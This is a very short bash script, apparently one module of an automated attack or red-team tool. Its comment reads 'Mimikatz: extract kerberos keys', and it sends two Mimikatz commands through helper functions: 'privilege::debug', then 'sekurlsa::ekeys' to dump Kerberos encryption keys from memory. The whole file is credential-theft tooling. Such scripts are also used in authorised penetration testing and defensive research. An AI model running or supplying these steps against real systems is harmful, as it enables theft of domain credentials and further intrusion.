#!/bin/bash

: '
Mimikatz: extract kerberos keys
'

execute_command "privilege::debug"
create_new_line
sleep 1

execute_command "sekurlsa::ekeys"
create_new_line
